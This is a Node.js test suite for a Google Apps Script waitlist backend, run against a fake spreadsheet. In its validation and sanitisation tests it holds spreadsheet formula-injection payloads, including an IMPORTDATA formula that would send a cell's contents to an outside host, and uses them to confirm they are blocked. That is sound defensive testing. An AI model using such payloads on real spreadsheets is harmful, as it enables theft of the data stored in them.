// Runs Code.gs against a fake spreadsheet. No Google account or network needed.
//   node --test apps-script/Code.test.cjs
const test = require('node:test');
const assert = require('node:assert/strict');
const fs = require('node:fs');
const path = require('node:path');
const vm = require('node:vm');
const crypto = require('node:crypto');

const SOURCE = fs.readFileSync(path.join(__dirname, 'Code.gs'), 'utf8');

// ------------------------------------------------------------------- fakes

class FakeSheet {
  constructor(name, rows = [], { maxCols = 26, maxRows = 1000 } = {}) {
    this.name = name;
    this.cells = rows.map((row) => row.slice());
    this.maxCols = maxCols;
    this.maxRows = maxRows;
    this.rawWrites = [];
    this.formulas = [];
    this.formats = [];
    this.trips = 0; // every call that would cross the network to Google
  }
  getName() { return this.name; }
  getMaxColumns() { this.trips++; return this.maxCols; }
  getMaxRows() { this.trips++; return this.maxRows; }
  insertColumnsAfter(after, count) {
    this.trips++;
    assert.equal(after, this.maxCols, 'columns are only ever added at the end');
    this.maxCols += count;
  }
  insertRowsAfter(after, count) {
    this.trips++;
    assert.equal(after, this.maxRows, 'rows are only ever added at the end');
    this.maxRows += count;
  }
  filled(value) { return value !== '' && value !== undefined && value !== null; }
  getLastRow() {
    this.trips++;
    for (let r = this.cells.length - 1; r >= 0; r--) {
      if ((this.cells[r] || []).some((v) => this.filled(v))) return r + 1;
    }
    return 0;
  }
  getLastColumn() {
    this.trips++;
    let last = 0;
    for (const row of this.cells) {
      for (let c = (row || []).length - 1; c >= 0; c--) {
        if (this.filled(row[c])) { last = Math.max(last, c + 1); break; }
      }
    }
    return last;
  }
  read(r, c) {
    const value = (this.cells[r - 1] || [])[c - 1];
    return value === undefined || value === null ? '' : value;
  }
  // Mirrors Sheets: a leading "=" becomes a formula, a leading "'" marks text.
  write(r, c, value) {
    this.rawWrites.push({ r, c, value });
    while (this.cells.length < r) this.cells.push([]);
    const row = this.cells[r - 1] || (this.cells[r - 1] = []);
    while (row.length < c) row.push('');
    if (typeof value === 'string' && value.startsWith('=')) {
      this.formulas.push({ r, c, value });
      row[c - 1] = '#FORMULA';
    } else if (typeof value === 'string' && value.startsWith("'")) {
      row[c - 1] = value.slice(1);
    } else {
      row[c - 1] = value;
    }
  }
  getRange(row, col, numRows = 1, numCols = 1) {
    assert.ok(row >= 1 && col >= 1 && numRows >= 1 && numCols >= 1, `bad range ${row},${col},${numRows},${numCols}`);
    assert.ok(row + numRows - 1 <= this.maxRows, 'range runs past the last row');
    assert.ok(col + numCols - 1 <= this.maxCols, 'range runs past the last column');
    const sheet = this;
    const grid = (map) =>
      Array.from({ length: numRows }, (_, r) =>
        Array.from({ length: numCols }, (_, c) => map(sheet.read(row + r, col + c))));
    return {
      getValues: () => { sheet.trips++; return grid((v) => v); },
      getDisplayValues: () => { sheet.trips++; return grid((v) => String(v)); },
      setValues(values) {
        sheet.trips++;
        assert.equal(values.length, numRows, 'setValues row count');
        values.forEach((line, r) => {
          assert.equal(line.length, numCols, 'setValues column count');
          line.forEach((value, c) => sheet.write(row + r, col + c, value));
        });
        return this;
      },
      setNumberFormat(format) {
        sheet.trips++;
        sheet.formats.push({ row, col, numRows, numCols, format });
        return this;
      },
    };
  }
}

function load(sheets, { locked = false, bound = true } = {}) {
  const cache = new Map();
  const logs = [];
  const spreadsheet = {
    getName: () => 'DesertBooker waitlist',
    getUrl: () => 'https://docs.google.com/spreadsheets/d/FAKE/edit',
    getSheets: () => sheets,
    getSheetByName: (name) => sheets.find((s) => s.name === name) || null,
  };
  const sandbox = {
    SpreadsheetApp: {
      getActiveSpreadsheet: () => (bound ? spreadsheet : null),
      openById: () => spreadsheet,
      flush() {},
    },
    LockService: { getScriptLock: () => ({ tryLock: () => !locked, releaseLock() {} }) },
    CacheService: { getScriptCache: () => ({ get: (k) => cache.get(k) ?? null, put: (k, v) => cache.set(k, v) }) },
    Utilities: { getUuid: () => crypto.randomUUID() },
    ContentService: {
      MimeType: { JSON: 'application/json' },
      createTextOutput: (content) => ({ content, setMimeType() { return this; } }),
    },
    Logger: { log: (line) => logs.push(String(line)) },
    console: { error() {}, log() {} },
  };
  vm.runInNewContext(SOURCE, sandbox, { filename: 'Code.gs' });
  const post = (payload) =>
    JSON.parse(sandbox.doPost({ postData: { contents: typeof payload === 'string' ? payload : JSON.stringify(payload) } }).content);
  return { app: sandbox, post, logs, cache };
}

const ID_A = '11111111-1111-4111-8111-111111111111';
const ID_B = '22222222-2222-4222-8222-222222222222';
const join = (extra = {}) => ({
  action: 'join', id: ID_A, email: 'new@example.com', consent: true, audience: 'traveler',
  page: '/', website: '', device: 'desktop', referrer: 'https://www.google.com/',
  utm_source: 'insta', utm_medium: 'social', utm_campaign: 'launch', language: 'en-GB',
  timezone: 'Asia/Dubai', ...extra,
});

const CANONICAL = () => [
  ['timestamp', 'email', 'consent', 'audience', 'name', 'page'],
  [new Date('2026-09-20T10:00:00Z'), 'first@example.com', true, 'traveler', '', '/'],
  [new Date('2026-09-21T10:00:00Z'), 'second@example.com', true, 'operator', 'Dune Camp', '/'],
];

// Dates made inside the sandbox belong to another realm, so instanceof fails.
const isDate = (value) => Object.prototype.toString.call(value) === '[object Date]';
const header = (sheet) => sheet.cells[0].map(String);
const column = (sheet, name) => header(sheet).indexOf(name) + 1;
const cell = (sheet, row, name) => sheet.read(row, column(sheet, name));
const noFormulaStarts = (sheet) =>
  sheet.rawWrites.every((w) => typeof w.value !== 'string' || !/^[=+\-@]/.test(w.value));

// ------------------------------------------------------------------- tests

test('doGet reports the version', () => {
  const { app } = load([new FakeSheet('Sheet1', CANONICAL())]);
  assert.deepEqual(JSON.parse(app.doGet().content), { ok: true, service: 'desertbooker-waitlist', version: 4 });
});

test('join: appends a row, adds the columns, leaves old cells alone', () => {
  const sheet = new FakeSheet('Sheet1', CANONICAL());
  const before = JSON.stringify(CANONICAL());
  const { post } = load([sheet]);

  assert.deepEqual(post(join()), { ok: true, id: ID_A });

  const old = sheet.cells.slice(0, 3).map((row) => row.slice(0, 6));
  assert.equal(JSON.stringify(old), before, 'existing cells changed');
  assert.deepEqual(header(sheet).slice(0, 6), ['timestamp', 'email', 'consent', 'audience', 'name', 'page']);
  assert.equal(header(sheet).filter((h) => h === 'email').length, 1);
  for (const name of ['id', 'device', 'referrer', 'utm_source', 'utm_medium', 'utm_campaign', 'language',
    'timezone', 'been_before', 'feeling', 'feeling_other', 'experience', 'experience_other', 'timing',
    'blocker', 'op_area', 'op_offer', 'op_name']) {
    assert.ok(column(sheet, name) > 6, `column ${name} missing`);
  }
  assert.equal(sheet.getLastRow(), 4);
  assert.ok(isDate(cell(sheet, 4, 'timestamp')));
  assert.equal(cell(sheet, 4, 'email'), 'new@example.com');
  assert.equal(cell(sheet, 4, 'consent'), true);
  assert.equal(cell(sheet, 4, 'audience'), 'traveler');
  assert.equal(cell(sheet, 4, 'id'), ID_A);
  assert.equal(cell(sheet, 4, 'device'), 'desktop');
  assert.equal(cell(sheet, 4, 'referrer'), 'https://www.google.com/');
  assert.equal(cell(sheet, 4, 'utm_campaign'), 'launch');
  assert.equal(cell(sheet, 4, 'language'), 'en-GB');
  assert.equal(cell(sheet, 4, 'timezone'), 'Asia/Dubai');
  assert.equal(cell(sheet, 4, 'name'), '');
  assert.ok(sheet.formats.some((f) => f.format === '@'), 'new columns are plain text');
  assert.ok(noFormulaStarts(sheet));
});

test('join: the payload of the site as deployed today still works', () => {
  const sheet = new FakeSheet('Sheet1', CANONICAL());
  const { post } = load([sheet]);
  const reply = post({ email: 'legacy@example.com', consent: true, audience: 'operator', page: '/', website: '' });
  assert.equal(reply.ok, true);
  assert.match(reply.id, /^[0-9a-f-]{36}$/);
  assert.equal(cell(sheet, 4, 'audience'), 'operator');
  assert.equal(cell(sheet, 4, 'device'), '');
});

test('join: differently spelled headers are matched, not duplicated', () => {
  const sheet = new FakeSheet('Signups', [
    ['Date', 'Email Address', 'Type', 'Consent', 'Page'],
    [new Date('2026-09-20T10:00:00Z'), 'first@example.com', 'traveler', true, '/'],
  ]);
  const { post } = load([sheet]);
  assert.equal(post(join()).ok, true);
  assert.equal(header(sheet).filter((h) => /mail/i.test(h)).length, 1);
  assert.ok(!header(sheet).includes('timestamp'));
  assert.ok(!header(sheet).includes('audience'));
  assert.equal(sheet.read(3, 2), 'new@example.com');
  assert.equal(sheet.read(3, 3), 'traveler');
  assert.ok(isDate(sheet.read(3, 1)));
});

test('join: an email column under an unknown name is found by its content', () => {
  const sheet = new FakeSheet('Sheet1', [
    ['When', 'Contact', 'Notes'],
    ['20 Sep', 'first@example.com', 'met at expo'],
    ['21 Sep', 'second@example.com', ''],
  ]);
  const { post, app } = load([sheet]);
  assert.match(app.checkSheet(), /found by its content/);
  assert.deepEqual(post(join({ email: 'FIRST@example.com' })), { ok: true, duplicate: true });
  assert.equal(post(join()).ok, true);
  assert.ok(!header(sheet).includes('email'), 'a second email column was created');
  assert.equal(sheet.read(4, 2), 'new@example.com');
  assert.equal(sheet.read(2, 3), 'met at expo');
});

test('row 1 holding a signup stops everything and writes nothing', () => {
  const sheet = new FakeSheet('Sheet1', [
    ['20 Sep', 'first@example.com', 'traveler'],
    ['21 Sep', 'second@example.com', 'operator'],
  ]);
  const { post, app } = load([sheet]);
  assert.match(app.checkSheet(), /RESULT: STOP\. Row 1 holds a signup/);
  assert.match(app.setup(), /RESULT: STOP/);
  assert.deepEqual(post(join()), { ok: false, error: 'server_error' });
  assert.equal(sheet.rawWrites.length, 0);
});

test('an empty row 1 above data stops everything', () => {
  const sheet = new FakeSheet('Sheet1', [['', '', ''], ['20 Sep', 'note', 'x']]);
  const { post, app } = load([sheet]);
  assert.match(app.checkSheet(), /RESULT: STOP\. Row 1 is empty/);
  assert.deepEqual(post(join()), { ok: false, error: 'server_error' });
  assert.equal(sheet.rawWrites.length, 0);
});

test('empty sheet: setup writes every header, then join works', () => {
  const sheet = new FakeSheet('Sheet1', []);
  const { post, app } = load([sheet]);
  assert.match(app.checkSheet(), /RESULT: OK\. 23 column\(s\) will be added/);
  assert.equal(sheet.rawWrites.length, 0, 'checkSheet must not write');
  assert.match(app.setup(), /RESULT: DONE\. 23 column\(s\) added/);
  assert.ok(!header(sheet).includes('name'));
  assert.match(app.setup(), /RESULT: DONE\. 0 column\(s\) added/);
  assert.equal(header(sheet).length, 23);
  assert.equal(post(join()).ok, true);
  assert.equal(cell(sheet, 2, 'email'), 'new@example.com');
});

test('duplicate headers are reported and the first one is used', () => {
  const sheet = new FakeSheet('Sheet1', [
    ['timestamp', 'email', 'audience', 'Email'],
    ['20 Sep', 'first@example.com', 'traveler', 'other@example.com'],
  ]);
  const { post, app } = load([sheet]);
  assert.match(app.checkSheet(), /Columns B and D have the same name/);
  assert.deepEqual(post(join({ email: 'first@example.com' })), { ok: true, duplicate: true });
});

test('a sheet near the 26 column limit gets more columns', () => {
  const wide = ['timestamp', 'email', 'consent', 'audience', 'page'];
  for (let i = 0; i < 15; i++) wide.push('my column ' + i);
  const sheet = new FakeSheet('Sheet1', [wide], { maxCols: 26 });
  const { post } = load([sheet]);
  assert.equal(post(join()).ok, true);
  assert.ok(sheet.maxCols > 26);
  assert.equal(cell(sheet, 2, 'id'), ID_A);
});

test('the tab with an email column is chosen over the first tab', () => {
  const notes = new FakeSheet('Notes', [['todo'], ['call camp']]);
  const list = new FakeSheet('Waitlist', CANONICAL());
  const { post, app } = load([notes, list]);
  assert.match(app.checkSheet(), /> Waitlist/);
  assert.equal(post(join()).ok, true);
  assert.equal(notes.rawWrites.length, 0);
  assert.equal(cell(list, 4, 'email'), 'new@example.com');
});

test('a standalone script with no sheet ID fails with JSON, not a crash', () => {
  const sheet = new FakeSheet('Sheet1', CANONICAL());
  const { post } = load([sheet], { bound: false });
  assert.deepEqual(post(join()), { ok: false, error: 'server_error' });
});

test('join: same id twice is one row; another id is a duplicate', () => {
  const sheet = new FakeSheet('Sheet1', CANONICAL());
  const { post } = load([sheet]);
  assert.deepEqual(post(join()), { ok: true, id: ID_A });
  assert.deepEqual(post(join()), { ok: true, id: ID_A });
  assert.deepEqual(post(join({ email: ' New@Example.com ' })), { ok: true, id: ID_A });
  assert.deepEqual(post(join({ id: ID_B })), { ok: true, duplicate: true });
  assert.equal(sheet.getLastRow(), 4);
});

test('join: an old row without an id never adopts one', () => {
  const sheet = new FakeSheet('Sheet1', CANONICAL());
  const { post } = load([sheet]);
  assert.deepEqual(post(join({ email: 'first@example.com' })), { ok: true, duplicate: true });
  assert.equal(cell(sheet, 2, 'id'), '');
  assert.equal(sheet.getLastRow(), 3);
});

test('join: an id already used by another row is replaced', () => {
  const sheet = new FakeSheet('Sheet1', CANONICAL());
  const { post } = load([sheet]);
  post(join());
  const reply = post(join({ email: 'third@example.com' }));
  assert.equal(reply.ok, true);
  assert.notEqual(reply.id, ID_A);
  assert.equal(cell(sheet, 5, 'id'), reply.id);
});

test('join: validation, honeypot, busy lock, bad bodies', () => {
  const sheet = new FakeSheet('Sheet1', CANONICAL());
  const { post } = load([sheet]);
  for (const email of ['', 'nope', 'a@b', '=cmd@a.co', '+x@a.co', '-x@a.co', '@a.co', 'a b@c.co',
    '=IMPORTDATA("http://x.co/?"&B2)&"@a.co"', 'x'.repeat(250) + '@a.co', null, 42, {}]) {
    assert.deepEqual(post(join({ email })), { ok: false, error: 'invalid_email' }, String(email));
  }
  assert.equal(post(join({ email: "o'brien+tag@mail.example.co.uk" })).ok, true);
  assert.deepEqual(post(join({ email: 'c@example.com', consent: false })), { ok: false, error: 'consent_required' });
  assert.deepEqual(post(join({ email: 'c@example.com', consent: undefined })), { ok: false, error: 'consent_required' });
  assert.deepEqual(post(join({ email: 'bot@example.com', website: 'http://spam.example' })), { ok: true });
  assert.deepEqual(post('not json'), { ok: false, error: 'server_error' });
  assert.deepEqual(post('[1,2]'), { ok: false, error: 'server_error' });
  assert.deepEqual(post(join({ email: 'big@example.com', page: 'x'.repeat(11000) })), { ok: false, error: 'server_error' });
  assert.equal(sheet.getLastRow(), 4, 'only the one valid signup was stored');

  const busy = load([new FakeSheet('Sheet1', CANONICAL())], { locked: true });
  assert.deepEqual(busy.post(join()), { ok: false, error: 'busy' });
});

test('every stored text is safe from formulas and trimmed to size', () => {
  const sheet = new FakeSheet('Sheet1', CANONICAL());
  const { post } = load([sheet]);
  post(join({
    page: '=HYPERLINK("http://x")', referrer: '@SUM(1)', utm_source: '+1', utm_medium: '-1',
    utm_campaign: '\t=1+1', language: 'x'.repeat(500), timezone: 'a\nb', device: 'toaster',
  }));
  post({
    action: 'answers', id: ID_A, email: 'new@example.com', seq: 1, audience: 'operator',
    answers: { op_name: '=1+1', op_area: '  Liwa  ', op_offer: { a: 1 }, blocker: 'y'.repeat(900),
      experience: ['=A1', 'Stargazing', '', null, 7] },
  });
  assert.equal(sheet.formulas.length, 0, 'a formula reached the sheet');
  assert.ok(noFormulaStarts(sheet));
  assert.equal(cell(sheet, 4, 'op_name'), '=1+1');
  assert.equal(cell(sheet, 4, 'utm_campaign'), '=1+1');
  assert.equal(cell(sheet, 4, 'op_area'), 'Liwa');
  assert.equal(cell(sheet, 4, 'op_offer'), '');
  assert.equal(cell(sheet, 4, 'experience'), '=A1, Stargazing, 7');
  assert.equal(cell(sheet, 4, 'blocker').length, 300);
  assert.equal(cell(sheet, 4, 'language').length, 35);
  assert.equal(cell(sheet, 4, 'timezone'), 'a b');
  assert.equal(cell(sheet, 4, 'device'), '');
});

test('answers: fills the right row and blanks what is no longer sent', () => {
  const sheet = new FakeSheet('Sheet1', CANONICAL());
  const before = JSON.stringify(CANONICAL());
  const { post } = load([sheet]);
  post(join());
  post(join({ id: ID_B, email: 'camp@example.com', audience: 'operator' }));

  assert.deepEqual(post({
    action: 'answers', id: ID_A, email: 'new@example.com', seq: 1, audience: 'traveler',
    answers: { been_before: 'Yes', feeling: 'Something else', feeling_other: 'silence',
      experience: ['Camel ride', 'Stargazing'], timing: 'This winter' },
  }), { ok: true });
  assert.equal(cell(sheet, 4, 'been_before'), 'Yes');
  assert.equal(cell(sheet, 4, 'feeling_other'), 'silence');
  assert.equal(cell(sheet, 4, 'experience'), 'Camel ride, Stargazing');
  assert.equal(cell(sheet, 4, 'timing'), 'This winter');

  // The person goes back and changes Yes to No: timing must disappear.
  post({
    action: 'answers', id: ID_A, email: 'new@example.com', seq: 2, audience: 'traveler',
    answers: { been_before: 'No', feeling: 'Adventure and adrenaline', blocker: 'too hot' },
  });
  assert.equal(cell(sheet, 4, 'been_before'), 'No');
  assert.equal(cell(sheet, 4, 'timing'), '');
  assert.equal(cell(sheet, 4, 'feeling_other'), '');
  assert.equal(cell(sheet, 4, 'experience'), '');
  assert.equal(cell(sheet, 4, 'blocker'), 'too hot');

  post({
    action: 'answers', id: ID_B, email: 'camp@example.com', seq: 1, audience: 'operator',
    answers: { op_area: 'Liwa', op_offer: 'Both', op_name: 'Dune Camp' },
  });
  assert.equal(cell(sheet, 5, 'op_name'), 'Dune Camp');
  assert.equal(cell(sheet, 5, 'been_before'), '');
  assert.equal(cell(sheet, 4, 'op_name'), '');

  const old = sheet.cells.slice(0, 3).map((row) => row.slice(0, 6));
  assert.equal(JSON.stringify(old), before, 'existing cells changed');
  assert.equal(cell(sheet, 2, 'been_before'), '');
});

test('answers: a role change after Back updates the audience', () => {
  const sheet = new FakeSheet('Sheet1', CANONICAL());
  const { post } = load([sheet]);
  post(join());
  post({ action: 'answers', id: ID_A, email: 'new@example.com', seq: 1, audience: 'operator', answers: { op_area: 'Liwa' } });
  assert.equal(cell(sheet, 4, 'audience'), 'operator');
  post({ action: 'answers', id: ID_A, email: 'new@example.com', seq: 2, audience: 'admin', answers: {} });
  assert.equal(cell(sheet, 4, 'audience'), 'operator');
});

test('answers: an older save arriving late is ignored', () => {
  const sheet = new FakeSheet('Sheet1', CANONICAL());
  const { post } = load([sheet]);
  post(join());
  const send = (seq, feeling) => post({
    action: 'answers', id: ID_A, email: 'new@example.com', seq, audience: 'traveler', answers: { feeling },
  });
  assert.deepEqual(send(2, 'newer'), { ok: true });
  assert.deepEqual(send(1, 'older'), { ok: true, stale: true });
  assert.deepEqual(send(2, 'repeat'), { ok: true, stale: true });
  assert.equal(cell(sheet, 4, 'feeling'), 'newer');
  assert.deepEqual(send(3, 'newest'), { ok: true });
  assert.equal(cell(sheet, 4, 'feeling'), 'newest');
});

test('answers: the id and the email must both match', () => {
  const sheet = new FakeSheet('Sheet1', CANONICAL());
  const { post } = load([sheet]);
  post(join());
  const writes = sheet.rawWrites.length;
  const base = { action: 'answers', seq: 1, audience: 'traveler', answers: { feeling: 'hijack' } };
  for (const bad of [
    { id: ID_B, email: 'new@example.com' },
    { id: ID_A, email: 'first@example.com' },
    { id: '', email: 'first@example.com' },
    { id: 'short', email: 'new@example.com' },
    { email: 'first@example.com' },
    { id: ID_A },
  ]) {
    assert.deepEqual(post({ ...base, ...bad }), { ok: false, error: 'not_found' }, JSON.stringify(bad));
  }
  assert.equal(sheet.rawWrites.length, writes, 'a rejected request wrote to the sheet');
});

test('answers: rows are found by id, so sorting the sheet is safe', () => {
  const sheet = new FakeSheet('Sheet1', CANONICAL());
  const { post } = load([sheet]);
  post(join());
  const [head, a, b, c] = sheet.cells;
  sheet.cells = [head, c, b, a];
  post({ action: 'answers', id: ID_A, email: 'new@example.com', seq: 1, audience: 'traveler', answers: { feeling: 'moved' } });
  assert.equal(cell(sheet, 2, 'email'), 'new@example.com');
  assert.equal(cell(sheet, 2, 'feeling'), 'moved');
  assert.equal(cell(sheet, 4, 'feeling'), '');
});

test('columns the owner added or moved are never written to', () => {
  const sheet = new FakeSheet('Sheet1', [
    ['my score', 'email', 'my notes', 'timestamp', 'audience', 'op_name', 'follow up'],
    ['=LEN(B2)', 'first@example.com', 'vip', '20 Sep', 'operator', '', 'yes'],
  ]);
  const { post } = load([sheet]);
  post(join({ audience: 'operator' }));
  post({ action: 'answers', id: ID_A, email: 'new@example.com', seq: 1, audience: 'operator', answers: { op_name: 'Dune Camp' } });
  const touched = new Set(sheet.rawWrites.map((w) => w.c));
  for (const name of ['my score', 'my notes', 'follow up']) {
    assert.ok(!touched.has(column(sheet, name)), `wrote to "${name}"`);
  }
  assert.equal(sheet.read(2, 1), '=LEN(B2)');
  assert.equal(sheet.read(3, 6), 'Dune Camp');
  assert.equal(sheet.read(3, 2), 'new@example.com');
});

test('new signups go under the last email, even with stray content below', () => {
  const rows = CANONICAL();
  rows.push(['', '', '', '', '', '']);
  rows.push(['', '', '', '', '', 'total: 2']);
  const sheet = new FakeSheet('Sheet1', rows);
  const { post, app } = load([sheet]);
  assert.match(app.checkSheet(), /content below the last email/);
  post(join());
  assert.equal(cell(sheet, 4, 'email'), 'new@example.com');
  assert.equal(sheet.read(5, 6), 'total: 2');
});

test('the check report lists columns and holds no email addresses', () => {
  const sheet = new FakeSheet('Sheet1', CANONICAL());
  const { app } = load([sheet]);
  const report = app.checkSheet();
  assert.match(report, /MODE: check/);
  assert.match(report, /email\s+column B "email"/);
  assert.match(report, /id\s+will be added/);
  assert.match(report, /Signups found: 2/);
  assert.match(report, /Next signup goes to row: 4/);
  assert.match(report, /RESULT: OK\. 18 column\(s\) will be added/);
  assert.ok(!/@example\.com/.test(report), 'the report leaked an email address');
  assert.equal(sheet.rawWrites.length, 0);
});

test('repeated emails already in the sheet are reported', () => {
  const rows = CANONICAL();
  rows.push([new Date('2026-09-22T10:00:00Z'), 'FIRST@example.com', true, 'traveler', '', '/']);
  const { app } = load([new FakeSheet('Sheet1', rows)]);
  assert.match(app.checkSheet(), /1 email\(s\) appear more than once/);
});

test('a sheet with no spare rows grows before the write', () => {
  const sheet = new FakeSheet('Sheet1', CANONICAL(), { maxRows: 3 });
  const { post } = load([sheet]);
  assert.equal(post(join()).ok, true);
  assert.ok(sheet.maxRows > 3);
  assert.equal(cell(sheet, 4, 'email'), 'new@example.com');
});

test('a request on a prepared sheet makes few round trips', () => {
  const sheet = new FakeSheet('Sheet1', CANONICAL());
  const { post, app } = load([sheet]);
  app.setup();

  sheet.trips = 0;
  assert.equal(post(join()).ok, true);
  assert.ok(sheet.trips <= 5, 'join took ' + sheet.trips + ' round trips');

  sheet.trips = 0;
  assert.equal(post({
    action: 'answers', id: ID_A, email: 'new@example.com', seq: 1, audience: 'traveler',
    answers: { been_before: 'Yes' },
  }).ok, true);
  assert.ok(sheet.trips <= 6, 'answers took ' + sheet.trips + ' round trips');
});

test('email and id columns far apart are still read correctly', () => {
  const head = ['email'];
  for (let i = 0; i < 20; i++) head.push('my column ' + i);
  head.push('id');
  const old = ['first@example.com'];
  for (let i = 0; i < 20; i++) old.push('x');
  old.push(ID_B);
  const sheet = new FakeSheet('Sheet1', [head, old], { maxCols: 60 });
  const { post } = load([sheet]);
  assert.deepEqual(post(join({ id: ID_B, email: 'FIRST@example.com' })), { ok: true, id: ID_B });
  assert.deepEqual(post(join()), { ok: true, id: ID_A });
  assert.equal(sheet.read(3, 1), 'new@example.com');
  assert.equal(sheet.read(3, 22), ID_A);
  assert.deepEqual(post({
    action: 'answers', id: ID_B, email: 'first@example.com', seq: 1, audience: 'operator', answers: { op_name: 'Far Camp' },
  }), { ok: true });
  assert.equal(cell(sheet, 2, 'op_name'), 'Far Camp');
  assert.equal(sheet.read(2, 2), 'x');
});

test('with several tabs the choice is remembered, and survives a rename', () => {
  const notes = new FakeSheet('Notes', [['todo'], ['call camp']]);
  const list = new FakeSheet('Waitlist', CANONICAL());
  const { post, cache } = load([notes, list]);
  assert.equal(post(join()).ok, true);
  assert.equal(cache.get('tab'), 'Waitlist');

  notes.trips = 0;
  assert.equal(post(join({ id: ID_B, email: 'two@example.com' })).ok, true);
  assert.equal(notes.trips, 0, 'the other tab was searched again');
  assert.equal(notes.rawWrites.length, 0);

  list.name = 'Signups';
  assert.deepEqual(post(join({ id: ID_B, email: 'two@example.com' })), { ok: true, id: ID_B });
  assert.equal(cache.get('tab'), 'Signups');
});

test('the report names the file and counts the rows that hold answers', () => {
  const sheet = new FakeSheet('Sheet1', CANONICAL());
  const { post, app } = load([sheet]);
  assert.match(app.checkSheet(), /Signups that answered at least one question: 0/);
  post(join());
  post(join({ id: ID_B, email: 'camp@example.com', audience: 'operator' }));
  post({ action: 'answers', id: ID_B, email: 'camp@example.com', seq: 1, audience: 'operator', answers: { op_area: 'Liwa' } });
  const writes = sheet.rawWrites.length;
  const report = app.checkSheet();
  assert.match(report, /FILE \(open this address/);
  assert.match(report, /DesertBooker waitlist\n  https:\/\/docs\.google\.com\/spreadsheets\/d\/FAKE\/edit/);
  assert.match(report, /Signups found: 4/);
  assert.match(report, /Signups that answered at least one question: 1/);
  assert.ok(!/@example\.com/.test(report), 'the report leaked an email address');
  assert.equal(sheet.rawWrites.length, writes, 'checkSheet must not write');
});

test('question headers: row 1 is renamed and everything still lands in place', () => {
  const sheet = new FakeSheet('Sheet1', CANONICAL());
  const before = JSON.stringify(CANONICAL().slice(1));
  const { post, app } = load([sheet]);
  app.setup();
  post(join());
  post({
    action: 'answers', id: ID_A, email: 'new@example.com', seq: 1, audience: 'traveler',
    answers: { been_before: 'Yes', timing: 'This winter' },
  });
  const at = { timing: column(sheet, 'timing'), area: column(sheet, 'op_area'), name: column(sheet, 'op_name') };

  const log = app.useQuestionHeaders();
  assert.match(log, /op_area  ->  Where is your camp\?/);
  assert.match(log, /RESULT: DONE\. 10 column name\(s\) changed/);
  assert.equal(sheet.read(1, at.area), 'Where is your camp?');
  assert.equal(sheet.read(1, at.name), 'What is the name of your camp?');
  assert.equal(sheet.read(1, at.timing), 'When are you thinking of going again?');
  assert.deepEqual(header(sheet).slice(0, 6), ['timestamp', 'email', 'consent', 'audience', 'name', 'page']);
  assert.ok(header(sheet).includes('id') && header(sheet).includes('utm_source'), 'other names are kept');
  assert.equal(sheet.read(4, at.timing), 'This winter', 'data rows are untouched');
  assert.equal(JSON.stringify(sheet.cells.slice(1, 3).map((row) => row.slice(0, 6))), before);

  const width = header(sheet).length;
  assert.match(app.useQuestionHeaders(), /RESULT: DONE\. 0 column name\(s\) changed/);
  assert.match(app.setup(), /RESULT: DONE\. 0 column\(s\) added/);
  assert.match(app.checkSheet(), /op_name\s+column \w+ "What is the name of your camp\?"/);
  assert.equal(header(sheet).length, width, 'a column was added beside a renamed one');

  post(join({ id: ID_B, email: 'camp@example.com', audience: 'operator' }));
  post({
    action: 'answers', id: ID_B, email: 'camp@example.com', seq: 1, audience: 'operator',
    answers: { op_area: 'Liwa', op_offer: 'Both', op_name: 'Dune Camp' },
  });
  assert.equal(sheet.read(5, at.area), 'Liwa');
  assert.equal(sheet.read(5, at.name), 'Dune Camp');
  assert.equal(header(sheet).length, width);
});

test('question headers: a sheet that is not ready is left alone', () => {
  const sheet = new FakeSheet('Sheet1', [['20 Sep', 'first@example.com'], ['21 Sep', 'second@example.com']]);
  const { app } = load([sheet]);
  assert.match(app.useQuestionHeaders(), /RESULT: STOP/);
  assert.equal(sheet.rawWrites.length, 0);
});
